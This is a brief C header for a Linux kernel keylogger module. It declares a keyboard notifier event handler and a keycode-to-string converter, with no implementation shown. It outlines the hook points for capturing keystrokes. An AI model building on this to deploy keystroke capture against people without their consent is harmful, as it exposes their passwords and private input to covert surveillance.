#ifndef __KEYLOG_H__
#define __KEYLOG_H__

#include <linux/keyboard.h>
#include <linux/input.h>

void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size);
int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param);

#endif